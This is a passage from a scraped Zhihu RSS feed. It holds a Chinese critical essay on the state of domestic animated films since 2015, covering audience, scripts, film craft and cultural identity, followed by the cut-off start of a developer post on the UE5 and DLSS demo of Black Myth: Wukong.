href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/402762072?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"中国动画现在的发展如何？","date":"2021-08-24 11:30:09","description":"\n<blockquote>如今的国产动画电影在创作风格上普遍呈现“日美中”三国的混搭，刻薄地说，就是“用中国题材，以美国形式，讲日式二次元故事”。</blockquote>\n<p>《大圣归来》在2015年暑期档斩获的9.54亿元票房和因该片而流行开的“自来水”概念，被认为是“国漫崛起”的重要标志（“国漫”这个词将动画与漫画混为一谈，但作为一个已经在大众媒体流传开来的经典误用，本文仅在此使用一次，特此注明）。相比于“昙花一现”的“国产科幻崛起”，仅针对成年观众的国产三维动画长片这一细分门类来说，这六年来创作者与市场给予了一定的持续性正向反馈。如今的大陆电影市场上，国产动画电影是一条热门赛道，不仅是每个档期必备的重要种子选手，催生了如《哪吒：魔童降世》50.35亿元的票房奇迹，甚至已经在特殊档期能够承载“救市”的期待（如今年7月上映的《白蛇2：青蛇劫起》），制片方借助IP实现“电影宇宙”的构建也不再是空谈。</p>\n<p>可以说，国产动画电影这一类型片种在大陆市场上的持续性输出和商业成功是具有开创性的，无论是从横向还是纵向观察，在任何一个电影市场上都是少见的——完全可以说，国产动画电影的发展，正是近年来“讲述中国故事”这一文化路线的实操成果。</p>\n<p>然而，这条赛道越发热门，竞争就越发激烈，每年试图分一杯羹的“炮灰”数不胜数。即使是在市场上得到良好反馈的作品，也不一定满足了创作者和观众热情饱满的期待；对国产动画电影的火爆现状终究会归于沉寂的担忧声音，在每一部“出圈”的动画电影上映时都会响起。实际上，当初业界惊呼“产业崛起”时的高涨情绪，经过六年之后，逐渐被某种流于日常的平庸感所攫取：这一行业和类型到了现在，已经没什么“惊奇”可言。</p>\n<p>虽然作品还在持续不断地推出，票房也都基本达到预期，然而国产动画电影在翻过高山之后，似乎进入到一个波澜不惊的平庸期：目所能及的尝试与突破都已走到尽头，依然信心高涨的创作者们身后，观众和市场仿佛在暗中酝酿一场改换门庭的暗影危机。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d35d24cdab0b0b33fa4ca65c030af6d4_720w.jpg?rss\" data-caption=\"《哪吒之魔童降世》票房破50亿海报。图片：《哪吒之魔童降世》电影官方微博\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"1422\" data-watermark=\"original\" data-original-src=\"v2-d35d24cdab0b0b33fa4ca65c030af6d4\" data-watermark-src=\"v2-c4c3ae32d0e22e7b4eb10f906e853fea\" data-private-watermark-src=\"v2-88a0884a1d7091f5b1b9664252f0e0b5\"></p>\n<p><b>国产动画电影的受众到底是谁？</b></p>\n<p>这个问题荒谬吗？从票房成绩上来看，也许并不。我们可以列出一张2015年后比较重要的国产动画电影（非针对儿童市场）票房成绩表：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-35faa1cb8d149dd646bdc32f795e951b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"519\" data-rawheight=\"296\" data-watermark=\"original\" data-original-src=\"v2-35faa1cb8d149dd646bdc32f795e951b\" data-watermark-src=\"v2-bba80e118805c27411e15dbcbdff8250\" data-private-watermark-src=\"v2-61f131f4d014c57f30ef9178f3b32de0\"></p>\n<p>一旦我们将针对儿童市场的《熊出没》系列等片排除出考察范围，国产动画电影的票房成绩显示出一个清晰的基本盘：人民币3-6亿。也就是说，如果无法创造全民性的、超越动画电影本身受众范围的“出圈效应”，类似《白蛇》系列这样口碑表现良好的优质IP的最终票房射程大致也就在6亿左右：虽然这个数字在票房整天“放卫星”的大陆市场毫不起眼，但在动画电影类型中已是极佳的成绩，足以支撑追光动画规划自己的“动画宇宙”；毕竟还有更多作品根本无法企及这一数字，比如创造了足够的话题，却因题材限制致使受众无法扩展的《大护法》，又比如在2021年企图借助动画电影风口一飞冲天最终沦为市场失败者的《西游记之再世妖王》（1.13亿）和《济公之降龙降世》（4064万）。</p>\n<p>拨开《哪吒之魔童降世》的“全民神话”，尽管拥有超高的关注度，国产动画电影整体上绝非当今市场特别青睐的类型。真正成功的作品凤毛麟角，想要达到3-6亿的基本盘都得费尽心思，类似《哪吒》和《姜子牙》这样的奇迹基本不可复制（实际上，从《姜子牙》的营销投入和观众的期待值来看，16.02亿的成绩绝非成功）。</p>\n<p>由此可以解释，为何几乎每部在大陆上映的国产动画电影都不可避免地进行“卖惨”式营销，为何每部作品都是制作方砸锅卖铁苦心孤诣，搞得仿佛一旦失败中国动画就将暗无天日似的，哪怕几年下来观众对这样的营销基本脱敏：虽然这些话术都是俗烂的营销手段，但某种意义上也是现实——制片方肯定掌握更加详细的用户大数据信息，他们的结论就是这个市场不太大。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-b5567cb7103e81d1b0cb8b7f7e3e380a_720w.jpg?rss\" data-caption=\"原定于2020年大年初一上映的《姜子牙》与《哪吒之魔童降世》的联动海报。图片：《姜子牙》电影官方微博\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"1161\" data-watermark=\"original\" data-original-src=\"v2-b5567cb7103e81d1b0cb8b7f7e3e380a\" data-watermark-src=\"v2-42e4c131dafba1942f7acee50c96fe93\" data-private-watermark-src=\"v2-5e0de6db510f53068829ed2532acd0ba\"></p>\n<p>其实，也可以从近年重要的国产动画电影的选材和创作风格中，勾勒出受众画像。首先，从来没有人把“喜羊羊”和“熊出没”系列当作国产动画崛起的标志，可见其受众群体并不考虑儿童与他们的家长，而是与日本类似，以热爱动漫的青少年和二次元青年人为主；其次则是与美国动画市场类似，主攻在院线上映的动画长片，从角色设置到剧本结构均以迪士尼为师，受众目标是经常光临影院的青年观影群体；其三，选材和文学基础上具有浓郁的网络文学特质，遵循电子游戏的冒险逻辑，品味和审美较为迎合青年男性（哪怕是以女性做主角）——类似“我命由我不由天”“有朝一日权在手”“天道还是人道”的“中二”式男性幻想往往是国产动画电影文本创作的思想底色。</p>\n<p>有趣的地方是：我们是在勾勒一种类型片的受众吗？不，我们似乎是在精准地筛选出一群特殊而小众的群体。这群人首先有足够的年龄，其次对日式二次元文化有兴趣，又不排斥美国的动画长片文化，又是院线电影的忠实爱好者，既能接受美式三维动画的低龄画风，还热衷于修仙武侠题材的网络文学与中二的成长叙事——这样的用户画像几乎是“缝合怪”，它不是寻找观众的最大公约数，反而是在筛选核心观众，本质上是与尽可能包括所有群体的“合家欢”商业逻辑相违背的。</p>\n<p>理论上，国产动画电影的风格包罗万象，百花齐放，多元性强，似乎是一个尽量包含了动画爱好者所有能够想到的领域的聚合体，但实际上，它却是一个内在元素时常自相矛盾，对观众来说时而新奇莫名，时而一锅乱炖的“弗兰肯斯坦”。单论创新程度，值得鼓励也颇令人疑惑的事实是：国产动画电影的确走出了一条全新的路径，创造出了一套中国大陆独有的动画电影语汇，的确拍摄出了世界罕见，绝对“中国特色”的动画电影。这甚至与观众不完全相关，与制片方的商业规划也不完全符合，甚至追溯到本源，可能和中国最早的那一批动画导演的个人经历与审美有关。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-3efbdefd55f4f61901ceb397b0a5171a_720w.jpg?rss\" data-caption=\"风格颇受宫崎骏影响的《大鱼海棠》剧照。图片：豆瓣电影\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"417\" data-watermark=\"original\" data-original-src=\"v2-3efbdefd55f4f61901ceb397b0a5171a\" data-watermark-src=\"v2-81cd6465e231ca1f4d5f9fe6a6293f41\" data-private-watermark-src=\"v2-aba83795575febc9e3dab4a336ab602f\"></p>\n<p>总的来说，如今的国产动画电影在创作风格上普遍呈现“日美中”三国的混搭，刻薄地说，就是“用中国题材，以美国形式，讲日式二次元故事”。</p>\n<p>其一，国产动画电影的创作者不可避免地有爱好日式二次元的背景，这一背景对创作最大的影响是：否认动画是一种只面向儿童的艺术形式，认为动画可以用来讲述任何年龄段都能欣赏的故事。与此同时，却又因为创作者自身年龄的取向，较为专注于写作青少年的个人成长故事。</p>\n<p>其次，作为在院线上映的电影，从形式上就受到美国动画长片创作风格的影响。首先是剧本写作上的结构式模仿，主打追寻个人价值、认识自我的美式主题诉求与日式成长故事的融合；从人物设置上拷贝美国动画的既有经验，比如必然为主角建设一个跟班小分队，肯定存在一到两个模仿梦工厂动画片的搞笑角色，基本会为主角安排“萌宠”；剧本结构完全按照好莱坞商业电影的三段式逻辑来写作，处处追求“大片”范，最后一幕主角的“重新崛起”已成为固定套路和规范习题；</p>\n<p>值得一提的是，除了少数画风独特的作品，国产动画电影基本采取美国动画电影低龄非真人比例的三维画风，这一选择是否与技术能力和成本控制有关尚有争议（毕竟如今国产单机游戏开发都已普遍使用虚幻4引擎），但却从根本上导致国产动画电影时常以低幼的合家欢画风，表现成熟深刻（抑或是故作深沉的中二伪深度）的故事，无时不在的本质违和感近乎荒谬。</p>\n<p>其三，在多重因素的鼓励下，国产动画电影大都把自身的创作与“国潮”“传播中华传统文化”“讲述中国故事”绑定，自我规定为中国经典神话IP的再创作。《西游记》《封神榜》和《白蛇传》三大源流基本上垄断了目前大多数国产动画电影的选题，导致六年来总数虽不到二十部，但很多人物和故事却已经被反复地、多角度地讲述，观众已经进入疲劳期；而从目前的状况看来，解决疲劳的方式却并不是扩展和拓展题材（哪怕只是寻找其他的中国神话和传统故事），相反是以各种视觉风格和文本解读角度不断重述既有的故事，这一发展方向显然是商业投资人的短视所致。</p>\n<p>回到一开始的问题，这个市场为什么不太大呢？其实，倒不如反问一句：爱好这么独特的“缝合怪”和“创新产物”的受众群体，真的会很大吗？</p>\n<p><img src=\"https://pic1.zhimg.com/v2-48d264004f490b3d6fa23abf8d0eed5f_720w.jpg?rss\" data-caption=\"《姜子牙》中的萌宠“四不像”。图片：豆瓣电影\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"335\" data-watermark=\"original\" data-original-src=\"v2-48d264004f490b3d6fa23abf8d0eed5f\" data-watermark-src=\"v2-75427e17c2b55f7cbe55b40da321670c\" data-private-watermark-src=\"v2-b32b850a46a69bf06b2ec2408fd6c5fc\"></p>\n<p><b>“剧本医生都不想再见到的程度”</b></p>\n<p>无论是业界还是观众，真正意义上认可国产动画产业的成功，都得从《大圣归来》和《哪吒之魔童降世》算起：国内的舆论环境显然认为在院线上映的电影长片才是“登堂入室”的标准，来自日本的以漫画和电视剧集为主，以“剧场版”“大电影”为辅助的模式并不被国人认可。既然把主战场放在院线，观众必然要以商业电影的标准来看待国产动画电影——那么，六年来我们遇到过几部剧本“合格”，可以被称为“剧本写作”的国产动画电影呢？有一说一，这个数字恐怕不多；虽然整个业界都知道“内容为王”，也绝对不是不重视编剧和剧本质量，每次都和观众保证编剧绝对用心了，然而大多数国产动画电影最后的剧本，恐怕都还是好莱坞的“剧本医生”都不想再见到的程度。</p>\n<p>首要问题是俗套。鉴于我们的题材集中于《西游记》《封神榜》和《白蛇传》这三个IP里，“创意”这个词的定义对国产动画编剧来说显然改变了，从创造变成了阐释，变成对古代故事进行现代解读。可是，为什么几乎每一个剧本的主旨都是寻找自我与自我实现呢？这未免太过于“现代性”了一些，我们的每个主角几乎一开始都不愿意做自己，都遇到了青春期的成长问题，暴躁、易怒、对世界有不一样的理解，满腔反抗精神，拷问自我的价值，从挫折中屡败屡战，寻找人生的解脱道路，并一定在故事的最后“找回了自己”，成为了“标题的那个人”——算了啰嗦了，其实我们的每个主角都是孙悟空，要么是周星驰的，要么是今何在的。</p>\n<p>当然，每部商业电影都存在主角自我实现这一母题，这固然不错，但相较于漫威宇宙采取的“类型片巡礼”路线——以谍战片、战争片、宫廷史诗片、无厘头喜剧片等各种类型来包裹超级英雄内核，国产动画电影这六年来的实践，大多数只选择了动作冒险片，甚至刻薄地说，是武侠偶像剧这唯一的类型路径。主题陈旧，孙悟空整天拷问自我，不知道自己是谁；剧本类型单一，不按“勇者斗恶龙”的冒险模式走就无法展开剧情；大多数时候，观众希望看到令人眼前一亮的故事基本是一种奢求。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-e8bec215de14356993f29b53144dd91e_720w.jpg?rss\" data-caption=\"《美国队长2》从剧作上是一部谍战片。图片：豆瓣电影\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"533\" data-watermark=\"original\" data-original-src=\"v2-e8bec215de14356993f29b53144dd91e\" data-watermark-src=\"v2-f5fa64bf0a03d0d8f8df35210ef79028\" data-private-watermark-src=\"v2-4bd9205911324313a463cd9eb2ab8fd9\"></p>\n<p>然而，哪怕是为了商业诉求上的安全采取既定的动作冒险片模式，兢兢业业完成的话至少不过不失，足以保证电影其他亮点的展现；但部分国产动画电影的剧本写作堪称敷衍，基本只是为了满足套路需求，为事先预设的大场面戏码提供甚至都说不太过去的理由。21世纪以来网络文学的“升级打怪”套路，或者说电子游戏所带来的清关思维取代了基本的情节写作，借自迪士尼的“萌宠”和借自梦工厂的主角团队内部搞笑吐槽互动取代了基本的人物塑造。</p>\n<p>2021年春节档的《新神榜：哪吒重生》被调侃为“靠死人推进剧情”，这个来自“民国蒸汽朋克”世界，开机车的“新哪吒”，连内心挣扎和自我实现戏码都欠奉，整部电影除了依靠亲人受伤和死亡一步步开发“小宇宙”提升战力之外，就不存在心理意义上的“成长”，剧情就是不断铺陈“挫折——变强——挫折——变更强——挫折——变超强”的“逆袭爽剧”，与动作冒险电子游戏的通关过程达成高度的形式一致性，导致电影完全沦为只为展现动作场面和技术能力、毋需观众操作的电子游戏视觉秀。</p>\n<p>其三，剧作的文学能力和审美品位始终未见提升。堪称“全民观影”的《哪吒之魔童降世》存在的最大争议，就是影片中大量“屎尿屁”风格的喜剧笑料。毫无疑问这是创作者针对商业需求所刻意设计的（也相对放大了导演饺子一贯的品味偏好），事实上也取得了前所未有的票房回报，但是商业电影中负责吸引大众的喜剧元素难道一定要是如此“下三路”的吗？</p>\n<p>由于国产动画电影的情节和格调基本脱胎于早期网络文学，一定程度上直观暴露了导演和编剧的文化底蕴。类似《姜子牙》中反复提及却流于平面的“人道还是天道”“如何拯救苍生”，《大圣归来》《新神榜：哪吒重生》中被一唱三叹的“弱者逆袭”“强者归位”，这类连网络文学都开始觉得陈腐的“定番”屡次上演，使得国产动画电影始终难以逃脱“中二”的底色，很难立足于经典故事真正讲出现代的新意，缺乏创作者希望拥有的“深刻”。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9f6d13e8dd9c78ef97ce4c2fda8353ed_720w.jpg?rss\" data-caption=\"《白蛇2：青蛇劫起》中的女性情感刻画。图片：豆瓣电影\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"450\" data-watermark=\"original\" data-original-src=\"v2-9f6d13e8dd9c78ef97ce4c2fda8353ed\" data-watermark-src=\"v2-b3622c3bfd5a8b2a8cf0f7291f0c775e\" data-private-watermark-src=\"v2-9cd8ba9b100f651dda4c16870511b091\"></p>\n<p>另外，国产动画电影中的女性角色，受到受众需求和创作者个人品味的引导，时常尴尬地使用非真人比例的卡通画风贩卖刻板印象的“软色情”，在女性角色的身材和服装设计上毫不掩饰地展现男性凝视。人物塑造上要么写成工具人，要么以极为可疑的视角来写作女性故事和女性之间的爱恋情感，颇有不真诚地“打女权牌”之嫌——不仅是编剧，国产动画电影创作团队的各个部门都被强烈的男性审美特征所把控，相对缺乏女性创作力量的注入。</p>\n<p>一个就摆在我们面前，但还是令人震惊的现实是：国产动画电影的剧本内容大多数取决于投资人、导演或者技术部门负责人，很少由专业的电影编剧来负责，甚至大多数执笔者也都不是专业编剧。导演往往沉迷对过往成功路径的依赖，不断地重复自己多少年都不熄灭的中二情怀；制片方往往会吹嘘他们是多么关心剧本，但他们往往关心的只是剧本中存在多少之前被市场证明过能够大卖的元素，只在乎剧本能不能顺畅地把技术部门想要画出来的大场面有逻辑（没逻辑也行）地串联起来，只想问编剧创造的角色和台词搞不搞笑，有没有金句爆点，到底像不像迪士尼。</p>\n<p>大部分国产动画电影最终的剧本文本呈现，基本由无数断裂的增删痕迹、被粗暴嵌入的对其他成功作品的模仿、白开水般交作业式的剧情对话，以及编剧最终放弃逻辑的沉默呐喊所构成。无论怎样的主题素材，何种人物和故事背景，最终都拍成了“孙悟空传”，都被串联为一个“搞笑角色在主角小分队中不断插科打诨的超级英雄动作冒险故事”（谁能想到《姜子牙》也能是一个超级英雄个人冒险故事？）：</p>\n<p>打败拦路的敌人，变得更强，找到自己，拯救苍生，观众和导演的中二病都在影片中被狠狠地满足了，而被宣传吸引进电影院的路人观众，没能与国产动画电影的经典青春期少男中二气质对上焦，观影过后满腔怒火地在社交网站上吐槽情节和剧本。这些声音，在一片“有笑有泪”“国产动画崛起”的呼声中往往显得特别孤单可笑，到头来不得不无奈地感叹：</p>\n<p>原来中国动画就是这样的啊？</p>\n<p><img src=\"https://pic2.zhimg.com/v2-a9d92c559bfbd12520cee14e06bb7d79_720w.jpg?rss\" data-caption=\"梦工厂出品《怪物史莱克》的主角团队角色设置成为广泛被模仿的定则。图片：豆瓣电影\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-a9d92c559bfbd12520cee14e06bb7d79\" data-watermark-src=\"v2-f4fa86481a5e907537153ff92295dab7\" data-private-watermark-src=\"v2-6ca6ad03293678b47af22a9c17862b1f\"></p>\n<p><b>他们到底讲的是“中国故事”吗？</b></p>\n<p>剧本的孱弱与失控只是国产动画电影制作全景中的一个缩影，它暴露的是制片方对“电影”这一艺术形式本体尊严的漠视：选择拍摄电影长片只是为了利润最大化，然而电影制作本身是有门槛的，甚至，剧本创作的门槛可能是其中最低的。当下国产动画电影的制作团队成员里有多少出身于“电影”而不是“动画”的呢？事实是，大多数创作者都是动画制作出身，哪怕厂商从好莱坞挖来的一线人才也基本都来自技术与特效部门，缺乏导演和独立创作经验——对他们来说，“电影”只是在把动画短片拉长而已。</p>\n<p>习惯于真人长片，有一定阅片量的电影观众，经常会在国产动画电影中看到匪夷所思的、教科书反例般的剪辑事故与运镜失误，其镜头语言的匮乏与低劣甚至远不如大多数电视连续剧。六年过去，国产动画电影的“电影质感”进步缓慢，始终处在极低的档次上，“观之不似电影”。电影作为一门视觉艺术，其视觉冲击力绝不仅仅是某些“大场面”，伴随迪士尼风格的甜腻画风，镜头语言的粗劣更是放大了观影的不适感，某种意义上，进一步加深了路人观众“这还是给小孩子看的”的误解。</p>\n<p>我们相信，上述误解是任何一个国产动画电影创作者都希望彻底破除的，但他们可能以为把剧本写得“黑深残”就能解决，而遗忘了以镜头语言为代表的一系列有关摄影、剪辑、音效、音乐等本质属于“电影”范畴的技术问题。作为对比，国产商业电影历经几十年的淬炼，已经逐渐普及了基础的电影制作“行活”，但很明显，与电影人完全不在一个赛道上的动画人，似乎没有真正意识到“电影”意味着什么。</p>\n<p>2015年以来的国产动画产量和票房的崛起，离不开国家文化政策对动漫产业的鼓励与扶持，实际上创作者们也异常自觉地将创作主题集中于传统文化题材，自觉地把自身与“国潮”“讲述中国故事”绑定，始终坚持站在“古风”亚文化的风口。由此可见，说他们沉溺于过往经验、故步自封是不公正的，显然他们足够审时度势，知道要把有限的力气花在哪里——与其下功夫提升观众一时半会看不出来的电影制作水准，不如将精力花在最惹人注意的题材和IP上，视觉和剧本只要以公认世界顶级的迪士尼为尊就不会出错；投资人和创作者固然如此精明，但值得反思的问题是，六年来，国产动画电影虽然基本都是国风题材，可是他们真的“讲述中国故事”了吗？</p>\n<p><img src=\"https://pic2.zhimg.com/v2-7e729ab88157a63694f80a0423c3584d_720w.jpg?rss\" data-caption=\"迪士尼经典动画电影《花木兰》剧照。图片：豆瓣电影\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-7e729ab88157a63694f80a0423c3584d\" data-watermark-src=\"v2-4704b3d05b8124e3eb420dc864d55579\" data-private-watermark-src=\"v2-b7d3cfa4725ca8edee67cf74b6183855\"></p>\n<p>这个问题说得更加直接一点，这些把中国经典神话和名著故事修改成好莱坞式个人成长故事的剧本，讲的是“中国”故事吗？也许，到头来只是一部部由中国人制作的迪士尼《花木兰》而已。这些动画电影在国外有多少影响力呢？甚至于，他们做到在国内范围向国人讲述中国故事的任务了吗？</p>\n<p>以票房50.35亿元的《哪吒之魔童降世》为例，尽管这个例子已经有些老生常谈：一个关于哪吒闹海故事的当代解读，剧本的核心主旨却落在了“家庭价值”之上，很难不令人感到荒谬。如果创作者是想表达传统的家庭价值，中国传统文化宝库中的素材并不缺少，可他们偏偏选择传统文化中反抗父权制的代表哪吒来阐释“父慈子孝”，将原作中哪吒与父权的不共戴天改换成亲情至上，在成长中与父母和解的温情戏码，让本来不服从任何强权的哪吒归顺“天道”，这其中的思维逻辑是如何运转的？</p>\n<p>有观点认为，现代解读要贴合时代精神，当下家庭价值是一种能够传遍世界的普世价值，这一解读是为了让哪吒的故事走向世界，让更多现代观众和外国观众理解——那么敢问，这部在国内席卷50.35亿票房的动画电影，怎么海外票房累计只有600多万美元，仅占到全球总票房的0.5%呢？</p>\n<p>抛开国产电影海外宣发的不易，最终这个拥护家庭价值的、属于世界的哪吒，还是没有走向世界（倒是一路破坏到底的孙悟空更容易被世界理解一些）。说到底，还是不要给他们戴上“文化输出”的高帽，他们当初选择让哪吒拥护家庭价值的根本原因，只不过是他们认为好莱坞的商业剧本模式是好的，而按照这个剧本模式写作的话，必然需要一个温和的价值观基底，那么直接沿用美国动画电影的“家庭观”是最方便的罢了——票房成绩也证明了他们的远见。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-fe1e00c3f67df2626f38dc1e00ed7312_720w.jpg?rss\" data-caption=\"家庭价值是《哪吒之魔童降世》的重要主题。图片：《哪吒之魔童降世》预告片截图\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"450\" data-watermark=\"original\" data-original-src=\"v2-fe1e00c3f67df2626f38dc1e00ed7312\" data-watermark-src=\"v2-1e1490e71b9fc6b523d95e443a4f6c5f\" data-private-watermark-src=\"v2-054a76fa548602be0ffccbcbe376f799\"></p>\n<p>只不过，这一点都不“国潮”，还是一部迪士尼的《花木兰》，而且是2020年的真人版；当初迪士尼动画版《花木兰》，甚至在跨文化视野上做得还很多元——别人在北美讲跨文化的中国故事，我们在中国讲普世故事。</p>\n<p>相较看来，虽然追光动画的《新神榜：哪吒重生》里的哪吒是个没成长的、反对一切的愣头青，剧本完全没有找到成长主题与原作精神的契合点，哪怕影片破除题材和时代限制玩起了蒸汽朋克、赛博朋克和荒野机车，哪怕影片在美术视觉上无限地“反叛”与现代，这个哪吒本质上都比《哪吒之魔童降世》更中国——此时，去批判这几部动画电影的主角塑造其实还是立足于美式个人英雄主义都显得苛求了，毕竟同样是塑造英雄，中国故事与世界故事的差异在哪里还需要进一步探索，但无论如何，都比直接把哪吒“父慈子孝”更中国一些。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-113c09309f7686c2ef4e5052d954bbb9_720w.jpg?rss\" data-caption=\"《新神榜：哪吒重生》中的“民国蒸汽朋克”街景。图片：《新神榜：哪吒重生》官方微博\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"335\" data-watermark=\"original\" data-original-src=\"v2-113c09309f7686c2ef4e5052d954bbb9\" data-watermark-src=\"v2-d22670673f5df44004c6bb50f7053585\" data-private-watermark-src=\"v2-e02fcee82f89bec1ce548a3344d940b8\"></p>\n<p>必然会有反对的声音说，这些国产动画电影的票房数字可观，对它们的受众群体大小、剧本和制作水平以及意识形态内容的反思都不成立，毕竟人民群众用电影票说话了——从票房数字的美梦中醒来吧！《白蛇2：青蛇劫起》救市成功了吗？在《哪吒之魔童降世》成功后被寄予了过高票房期望的国产动画电影，这两年间有哪一部真正达到口碑和票房的预期了呢？</p>\n<p>六年来观众用爱发电，每次都以拯救中国动画产业的牺牲心态购票入场，面对这些六年来没有什么长进，还在选题和创意上越发枯竭和套路化的作品，用如此的宽容所塑造的票房美梦还能坚持多久呢？距离破灭的日子已经不远了，也许在我们看不到的暗影中，在各大动画制片方还在紧锣密鼓地推出各种片单计划的背后，无论是观众还是投资方，都在默默寻找下一个淘金新风口——“国潮”“古风”依然坚挺，谁都还要吃这碗饭，但谁也没有说一定要在国产动画电影这个被定了型的缝合怪上吊死：其他的选择必然是有的。</p>\n<p>写作这篇反思录时，我与一名在国产动画电影行业里摸爬滚打多年的老同学做了交流，我询问我的部分想法是不是过分激烈、偏颇了一些，结果她说，“你这么温和是转性了吗？我们内部开会时说得比这狠多了”。她的这句话，可能是我对国产动画电影还抱有最后期望的原因；至少这些显而易见的问题，业界并不是熟视无睹的，之所以长久以来没有被解决，当然不会全是创作者的责任。那么，就一起把这些问题告诉资本方吧：六年来国产动画电影的崛起与“盛世”之下，可能需要一些看向未来的危言。</p>\n<p>注：文中引用大陆电影市场票房数据来自“猫眼专业版”app；海外电影票房数据来自美国专业网站Box Office Mojo。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e460fa339f4bc667a9fba12d8fb7b7b3_720w.jpg?rss\" data-caption=\"在日本等海外市场取得一定成功的《罗小黑战记》。图片：豆瓣电影\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"190\" data-watermark=\"original\" data-original-src=\"v2-e460fa339f4bc667a9fba12d8fb7b7b3\" data-watermark-src=\"v2-9b1d80b4a680ffd7babd9f705516093d\" data-private-watermark-src=\"v2-32a4280d73749de7387394d5066f861c\"></p>\n<p><br></p>\n<a href=\"http://link.zhihu.com/?target=https%3A//www.allnow.com/post/61231d0cfbcfb8144541fdaf%3Fplatform%3Dzh\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-9b776f0f147c66a018f49aa7dc1174e6_bh.jpg\" data-image-width=\"220\" data-image-height=\"100\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">高调崛起之后的暗影危机--国产动画电影六年反思录-全现在官方网站</a><p><br>关注<b><a href=\"https://www.zhihu.com/column/c_1374438877965520897\" class=\"internal\">次元研究专栏</a></b>，汇聚跨次元的浅趣深知。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ci-yuan-yan-jiu?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">次元研究</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/21831384/answer/2081202766?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">80 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/21760112?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评论中国动画？</a><br><a href=\"http://www.zhihu.com/question/410430997?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">为什么不能吹国产动画崛起？</a><br>\n","link":"http://www.zhihu.com/question/21831384/answer/2081202766?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"8 月 20 日游戏科学放出《黑神话：悟空》 UE5 实机内容演示，有哪些新信息？","date":"2021-08-20 04:00:11","description":"\n<p>大家好，游科小码农又来了~</p>\n<p><br></p>\n<p>离《黑神话：悟空》的首部视频发布刚好过去了一年。</p>\n<p>这365日，每日都在思考，怎么为这款东方写实画风的作品，带来尽可能高质量的画面，从技术层面排除一切障碍。</p>\n<p>就以首发视频来说，其实当时是留了一些遗憾的。</p>\n<p>例如，我们之前使用1080p而不是4k分辨率录制，另一方面看到了惊艳的UE5发布视频之后，也苦于没有办法渲染出同等高精细度的画面。</p>\n<p><br></p>\n<p>所以这次的视频，我们尝试追求两个目标：</p>\n<p><b>挑战更高的场景品质</b></p>\n<p><b>向4k60帧做一次冲刺</b></p>\n<p><br></p>\n<p>而这次的视频，有两个关键词：<b>UE5  &amp;  DLSS</b></p>\n<p>相信有些玩家朋友们已经get到，我们在这次实机录制中，借助Epic最新的UE5引擎，搭配Nvidia的DLSS技术，在画质和性能这两个本来是矛盾的维度上，同时获得了非常大的提升。</p>\n<p>我们一起来看看，这些新技术给这次的实机视频带来了怎样的提升。<br></p>\n<p><b>-Nanite</b></p>\n<p>UE5发布时展示了非常惊艳的Nanite技术，使用Nanite之后可以高性能渲染出面数以亿计的超高精度场景。这意味着我们可以使用精度非常高的模型去制作我们的场景。</p>\n<p>结合UE5的新阴影渲染技术virtual shadow map（虚拟阴影），还可以渲染非常高细节度的阴影。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-b2973ca07ccfacddf81bbd79d5eec7d0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1611\" data-rawheight=\"692\" data-watermark=\"watermark\" data-original-src=\"v2-b2973ca07ccfacddf81bbd79d5eec7d0\" data-watermark-src=\"v2-b54a9d170f424ce335f80cb4d0f2ec93\" data-private-watermark-src=\"v2-58d69696dcf879a1c322a2fe968a68fc\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-ea83c264bf0a00f8078dccbabc2bfd7e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"600\" data-watermark=\"watermark\" data-original-src=\"v2-ea83c264bf0a00f8078dccbabc2bfd7e\" data-watermark-src=\"v2-cd6f802a013747b825e1492fb573b971\" 